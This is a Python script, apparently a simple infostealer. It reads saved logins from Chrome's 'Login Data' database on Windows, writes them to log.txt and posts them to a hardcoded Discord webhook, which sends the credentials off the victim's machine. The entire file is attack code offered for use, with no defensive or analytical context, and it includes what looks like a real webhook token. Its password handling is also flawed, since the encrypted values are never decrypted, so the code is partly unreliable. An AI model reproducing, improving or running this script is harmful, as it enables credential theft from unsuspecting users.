import os
import sqlite3
import requests

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Function to send message to Discord webhook
def send_to_discord(message):
    payload = {'content': message}
    response = requests.post(webhook_url, json=payload)
    if response.status_code == 204:
        print("Message sent successfully to Discord webhook.")
    else:
        print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")
        print(f"Response: {response.text}")

# Function to get Chrome passwords
def get_chrome_passwords():
    passwords = []
    # Path to Chrome data directory (can vary based on OS)
    if os.name == "nt":  # Windows
        data_path = os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data\\Default"
    else:
        print("Unsupported OS")
        return passwords

    try:
        # Connect to Chrome database
        conn = sqlite3.connect(os.path.join(data_path, 'Login Data'))
        cursor = conn.cursor()

        # Query to retrieve passwords
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        passwords = cursor.fetchall()

        # Prepare message for Discord webhook
        message = "=== Chrome Saved Passwords ===\n"
        for url, username, password in passwords:
            message += f"App/Website: {url}\n"
            message += f"Password: {password}\n\n"

        # Write passwords to log.txt
        with open('log.txt', 'w') as f:
            f.write(message)

        # Send log.txt content to Discord webhook
        send_to_discord(message)

        print("Chrome passwords written to log.txt and sent to Discord webhook")

    except Exception as e:
        print(f"Error retrieving Chrome passwords: {e}")

    finally:
        # Close database connection
        cursor.close()
        conn.close()

# Example call to retrieve Chrome passwords and send them to Discord webhook
get_chrome_passwords()
